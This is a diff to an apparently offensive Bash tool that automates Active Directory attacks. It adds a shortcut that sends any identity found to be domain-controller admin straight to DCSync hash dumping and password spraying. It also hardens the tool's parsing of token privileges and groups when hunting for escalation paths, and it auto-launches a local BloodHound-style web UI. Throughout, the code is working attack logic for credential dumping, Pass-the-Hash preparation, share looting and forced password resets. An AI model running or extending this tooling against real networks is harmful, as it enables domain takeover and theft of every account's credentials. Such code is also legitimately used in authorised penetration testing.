@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.17.4"
+readonly VERSION="1.18.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -136,6 +136,8 @@ SPRAY_GEN=0         # 1 = also spray the domain-focused wordlist ONLINE (lockout
 KERBEROS=1          # 1 = prefer Kerberos for authenticated ops (best default)
 DCT=""              # authenticated-call target: FQDN under Kerberos, else IP
 HAVE_AUTH=0         # 1 once the CURRENT credential is validated
+IS_DC_ADMIN=0       # 1 when the CURRENT identity is local admin on the DC (Pwn3d!) →
+                    # nothing left to escalate: go straight to DCSync, skip the rest
 SUDO_KEEPALIVE_PID=""
 # Service capabilities, decided from the port scan — drive which techniques run
 CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
@@ -146,6 +148,10 @@ ROLLBACK_FILE=""    # records undo actions for responsible cleanup
 GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
 OWNED_FILE=""       # --owned: file of compromised principals to flag in the graph
 NO_OPEN=0           # 1 = never auto-open the graph in a browser
+WEB_UI=1            # 1 = auto-launch the ADAutoGraph web UI + import BH data (if installed)
+ADAUTOGRAPH_HOST="${ADAUTOGRAPH_HOST:-127.0.0.1}"
+ADAUTOGRAPH_PORT="${ADAUTOGRAPH_PORT:-8765}"
+ADAUTOGRAPH_DIR="${ADAUTOGRAPH_DIR:-}"   # override; else found beside this script
 PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword
 CERTIPY_TO=120      # hard timeout (s) on every certipy call — it loves to hang on
                     # an unreachable CA / bad DNS / Kerberos bind, and a hung scan
@@ -317,6 +323,13 @@ check_deps() {
     if _kerbrute_ok; then ok "kerbrute -> $KERBRUTE_BIN"
     else warn "kerbrute not a runnable binary at $KERBRUTE_BIN → spray falls back to netexec; variant userenum skipped"; fi
     if [[ -f "$WORDLIST" ]]; then ok "password wordlist -> $WORDLIST"; else warn "wordlist $WORDLIST missing (cracking limited)"; fi
+    # Optional: the ADAutoGraph web UI (separate repo). If present we auto-launch it
+    # and import the BloodHound data at the end of the run; otherwise we skip silently.
+    if [[ "$WEB_UI" == "1" ]]; then
+        local _ag; _ag=$(_adautograph_dir)
+        if [[ -n "$_ag" ]]; then ok "ADAutoGraph web UI -> $_ag"
+        else warn "ADAutoGraph (optional web UI) not found — get it: git clone https://github.com/C4sh3R/ADAutoGraph (or set ADAUTOGRAPH_DIR)"; fi
+    fi
 
     [[ "$missing" == "1" ]] && die "Missing required dependencies. Run ./install.sh"
 }
@@ -716,8 +729,10 @@ phase_validate_creds() {
     if echo "$out" | grep -q '\[+\]'; then
         HAVE_AUTH=1
         ok "Valid credentials for ${C_BOLD}$USER${C_RESET}"
-        echo "$out" | grep -qiE '\(Pwn3d!\)|\(admin\)' \
-            && loot "★★★ ${USER} is LOCAL ADMIN on the DC — direct path to DCSync ★★★"
+        if echo "$out" | grep -qiE '\(Pwn3d!\)|\(admin\)'; then
+            IS_DC_ADMIN=1
+            loot "★★★ ${USER} is LOCAL ADMIN on the DC — direct path to DCSync ★★★"
+        fi
     elif [[ "$HAVE_AUTH" == "1" ]]; then
         warn "SMB check inconclusive, but the TGT proves the creds — proceeding authenticated"
     else
@@ -1025,7 +1040,10 @@ phase_dcsync() {
             loot "ADMINISTRATOR HASH: $(echo "$l" | cut -d: -f4)"
         done
         ok "Full dump in secretsdump.txt → Pass-the-Hash ready"
-        if [[ "$DO_CRACK" == "1" ]]; then
+        if [[ "$IS_DC_ADMIN" == "1" ]]; then
+            info "Skipping NTLM cracking — already DC admin: every hash is Pass-the-Hash ready (ntlm_hashes.txt)"
+            grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
+        elif [[ "$DO_CRACK" == "1" ]]; then
             grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
             crack_hashes "$OUTDIR/ntlm_hashes.txt" 1000 "NTLM"
         fi
@@ -1261,18 +1279,36 @@ analyze_privileges() {
         [SeTcbPrivilege]="Act as part of the OS = SYSTEM"
         [SeCreateTokenPrivilege]="Forge tokens = SYSTEM"
     )
+    # nxc's winrm -x under Kerberos often returns a Python traceback / NTLMSSP parse
+    # error / empty string instead of the real command output. If we treat that as
+    # "no privileges" we LIE (e.g. it claimed administrator had nothing). So first
+    # confirm the output actually looks like whoami's: a 'SeXxxPrivilege' token or
+    # the 'Privilege Name' header. Otherwise report it as unreadable, not as empty.
+    local priv_ok=0 grp_ok=0
+    grep -qiE 'Se[A-Za-z]+Privilege|Privilege Name' <<<"$pr" && priv_ok=1
+    grep -qiE 'Group Name|Mandatory Label|BUILTIN\\|NT AUTHORITY|S-1-[0-9]' <<<"$gr" && grp_ok=1
+    if [[ "$priv_ok" == "0" && "$grp_ok" == "0" ]]; then
+        warn "Could not read the token over WinRM (exec failed/blocked) — privileges UNKNOWN, not empty (see whoami_priv_${USER}.txt)"
+        return
+    fi
+
     local found=0 k
-    for k in "${!P[@]}"; do
-        if echo "$pr" | grep -qi "$k"; then loot "★ Dangerous privilege: ${C_BOLD}$k${C_RESET} → ${P[$k]}"; found=1; fi
-    done
+    if [[ "$priv_ok" == "1" ]]; then
+        for k in "${!P[@]}"; do
+            if echo "$pr" | grep -qi "$k"; then loot "★ Dangerous privilege: ${C_BOLD}$k${C_RESET} → ${P[$k]}"; found=1; fi
+        done
+    fi
     # Dangerous group memberships
     local g
-    for g in "Backup Operators" "Server Operators" "Account Operators" "DnsAdmins" \
-             "Print Operators" "Hyper-V Administrators" "Group Policy Creator Owners" \
-             "Schema Admins" "Enterprise Admins" "Domain Admins"; do
-        echo "$gr" | grep -qi "$g" && { loot "★ Privileged group: ${C_BOLD}$g${C_RESET} → known escalation path"; found=1; }
-    done
-    [[ "$found" == "0" ]] && info "No standout dangerous privileges/groups on this token"
+    if [[ "$grp_ok" == "1" ]]; then
+        for g in "Backup Operators" "Server Operators" "Account Operators" "DnsAdmins" \
+                 "Print Operators" "Hyper-V Administrators" "Group Policy Creator Owners" \
+                 "Schema Admins" "Enterprise Admins" "Domain Admins" "Administrators"; do
+            echo "$gr" | grep -qi "$g" && { loot "★ Privileged group: ${C_BOLD}$g${C_RESET} → known escalation path"; found=1; }
+        done
+    fi
+    [[ "$priv_ok" == "1" && "$found" == "0" ]] && info "No standout dangerous privileges/groups on this token"
+    [[ "$priv_ok" == "0" && "$grp_ok" == "1" ]] && info "Read groups but not privileges over WinRM (whoami /priv exec failed) — see whoami_priv_${USER}.txt"
 }
 
 phase_winrm_dpapi() {
@@ -2340,6 +2376,7 @@ phase_ntds_local() {
 
 phase_share_loot() {
     [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
+    [[ "$IS_DC_ADMIN" == "1" ]] && { info "Skipping share spider — ${USER} is DC admin (DCSync covers everything)"; return; }
     section "SHARE LOOTING · INTERESTING FILES"
     local args; mapfile -t args < <(nxc_cred_args)
     local dl="$OUTDIR/shares"; mkdir -p "$dl"
@@ -3586,7 +3623,7 @@ open_in_browser() {
     elif have firefox;  then ( firefox  "$f"  >/dev/null 2>&1 & )
     elif have google-chrome; then ( google-chrome "$f" >/dev/null 2>&1 & )
     else return; fi
-    info "Opened graph.html in your browser"
+    case "$f" in http*://*) info "Opened $f in your browser";; *) info "Opened ${f##*/} in your browser";; esac
 }
 
 phase_bloodhound_graph() {
@@ -3603,6 +3640,76 @@ phase_bloodhound_graph() {
     else
         warn "Could not generate graph.html"
     fi
+}
+
+# --- ADAutoGraph: the standalone local BloodHound-style web UI (separate repo:
+# https://github.com/C4sh3R/ADAutoGraph). We auto-start it and POST the freshest
+# BloodHound zip to its /api/import endpoint, then open the browser. It's optional:
+# if it isn't installed beside this script (or via $ADAUTOGRAPH_DIR) we just skip.
+_adautograph_dir() {
+    [[ -n "$ADAUTOGRAPH_DIR" && -f "$ADAUTOGRAPH_DIR/server.py" ]] && { echo "$ADAUTOGRAPH_DIR"; return; }
+    local self base c
+    self=$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || echo "$0"); base=$(dirname "$self")
+    for c in "$base/../ADAutoGraph" "$base/ADAutoGraph" "$HOME/ADAutoGraph" "$HOME/tools/ADAutoGraph"; do
+        [[ -f "$c/server.py" ]] && { readlink -f "$c" 2>/dev/null || echo "$c"; return; }
+    done
+}
+_adautograph_up() {   # server already listening?
+    have curl && curl -fsS -m 3 "http://${ADAUTOGRAPH_HOST}:${ADAUTOGRAPH_PORT}/api/domains" >/dev/null 2>&1
+}
+phase_adautograph_web() {
+    [[ "$WEB_UI" != "1" || "$STEALTH" == "1" ]] && return
+    local dir; dir=$(_adautograph_dir)
+    [[ -z "$dir" ]] && return            # not installed → silent skip
+    have python3 || return
+    section "ADAUTOGRAPH · LOCAL BLOODHOUND-STYLE WEB UI"
+    local url="http://${ADAUTOGRAPH_HOST}:${ADAUTOGRAPH_PORT}"
+
+    # 1) start the server if it isn't already up -----------------------------------
+    if _adautograph_up; then
+        ok "ADAutoGraph already running → $url"
+    else
+        subsection "Starting ADAutoGraph ($dir)"
+        ( cd "$dir" && nohup python3 server.py --host "$ADAUTOGRAPH_HOST" --port "$ADAUTOGRAPH_PORT" \
+            >"$OUTDIR/adautograph_server.log" 2>&1 & )
+        local i; for i in $(seq 1 20); do _adautograph_up && break; sleep 0.5; done
+        if _adautograph_up; then ok "ADAutoGraph up → $url"
+        else warn "ADAutoGraph didn't come up (see adautograph_server.log)"; return; fi
+    fi
+
+    # 2) import the freshest BloodHound zip via /api/import -------------------------
+    local zip; zip=$(_bh_latest_zip)
+    if [[ -n "$zip" && -f "$zip" ]]; then
+        subsection "Importing BloodHound data → ADAutoGraph"
+        run "curl -F zip=@$(basename "$zip") -F name=${DOMAIN:-domain} $url/api/import"
+        local resp
+        if have curl; then
+            resp=$(curl -fsS -m 120 -F "zip=@${zip}" -F "name=${DOMAIN:-domain}" "$url/api/import" 2>&1)
+        else
+            resp=$(python3 - "$zip" "${DOMAIN:-domain}" "$url/api/import" <<'PY' 2>&1
+import sys,uuid,urllib.request
+zp,name,url=sys.argv[1],sys.argv[2],sys.argv[3]
+b=uuid.uuid4().hex
+def part(n,v): return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n'%(b,n,v)).encode()
+with open(zp,'rb') as f: data=f.read()
+body=part('name',name)
+body+=('--%s\r\nContent-Disposition: form-data; name="zip"; filename="bh.zip"\r\nContent-Type: application/zip\r\n\r\n'%b).encode()+data+b'\r\n'
+body+=('--%s--\r\n'%b).encode()
+req=urllib.request.Request(url,data=body,headers={'Content-Type':'multipart/form-data; boundary=%s'%b})
+print(urllib.request.urlopen(req,timeout=120).read().decode())
+PY
+)
+        fi
+        echo "$resp" >>"$LOGFILE"
+        if grep -q '"ok"' <<<"$resp"; then ok "Imported '${DOMAIN:-domain}' into ADAutoGraph"
+        else warn "Import didn't confirm — response: $resp"; fi
+    else
+        info "No BloodHound zip to import yet (run the BloodHound phase first)"
+    fi
+
+    # 3) open the browser on the web UI --------------------------------------------
+    open_in_browser "$url"
+    loot "ADAutoGraph web UI → ${C_BOLD}$url${C_RESET}"
 }
 
 # Standalone: turn a BloodHound zip straight into the interactive graph and open
@@ -3880,6 +3987,7 @@ final_summary() {
     # (gen_report/graph read files while they're still at the root).
     gen_report
     phase_bloodhound_graph
+    phase_adautograph_web
     finalize_loot
 
     echo
@@ -3900,7 +4008,7 @@ BH_DONE=0
 
 assess_current_credential() {
     SEEN_CREDS["${USER,,}"]=1
-    HAVE_AUTH=0; KERB_TICKET=""; unset KRB5CCNAME
+    HAVE_AUTH=0; IS_DC_ADMIN=0; KERB_TICKET=""; unset KRB5CCNAME
 
     section "ASSESSING IDENTITY · ${USER}"
     info "Credential: ${C_BOLD}${USER}${C_RESET} $( [[ -n "$HASH" ]] && echo '(NT hash / PtH)' || echo '(password)')"
@@ -3909,6 +4017,20 @@ assess_current_credential() {
     [[ "$HAVE_AUTH" != "1" ]] && { warn "Skipping further phases for $USER (no valid auth)"; return; }
 
     record_owned_identity        # log this compromised identity + its groups (for the summary)
+
+    # Already local admin on the DC → game over for this identity. Every remaining
+    # per-identity phase (shares, LAPS/gMSA, WinRM, token privs, ACL hunting, ESC,
+    # BloodHound edge abuse) exists only to ESCALATE — pointless now. Collect
+    # BloodHound once (for the graph/report) and DCSync; skip the rest.
+    if [[ "$IS_DC_ADMIN" == "1" ]]; then
+        info "${USER} is already DC admin → skipping enumeration/escalation phases, going straight to DCSync"
+        OWNED_ADMIN["${USER,,}"]=1
+        if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
+        phase_dcsync;       jitter
+        phase_password_spray
+        return
+    fi
+
     phase_auth_enum;    jitter
     phase_user_variants; jitter
     phase_share_loot;   jitter
@@ -3979,7 +4101,9 @@ ${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
   ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
   ${C_GREEN}--ntlm${C_RESET}         Force NTLM auth ${C_DIM}(default is Kerberos-first)${C_RESET}
   ${C_GREEN}--no-bh${C_RESET}        Skip BloodHound collection
-  ${C_GREEN}--no-open${C_RESET}      Don't auto-open graph.html in a browser
+  ${C_GREEN}--no-open${C_RESET}      Don't auto-open graph.html / the web UI in a browser
+  ${C_GREEN}--no-web${C_RESET}       Don't auto-launch the ADAutoGraph web UI + import BloodHound data
+  ${C_GREEN}--web-port${C_RESET} <n> Port for the ADAutoGraph web UI (default 8765)
   ${C_GREEN}-y, --yes${C_RESET}      Assume "yes" to all prompts — fully unattended run
   ${C_GREEN}--no-color${C_RESET}     Disable colored output (also honored via NO_COLOR=1)
   ${C_GREEN}-h, --help${C_RESET}     Show this help
@@ -4071,6 +4195,8 @@ parse_args() {
             --graph) GRAPH_ZIP="$2"; shift 2;;
             --owned) OWNED_FILE="$2"; shift 2;;
             --no-open) NO_OPEN=1; shift;;
+            --no-web) WEB_UI=0; shift;;
+            --web-port) ADAUTOGRAPH_PORT="$2"; shift 2;;
             --stealth) STEALTH=1; shift;;
             --ntlm) KERBEROS=0; shift;;
             --no-bh) DO_BLOODHOUND=0; shift;;
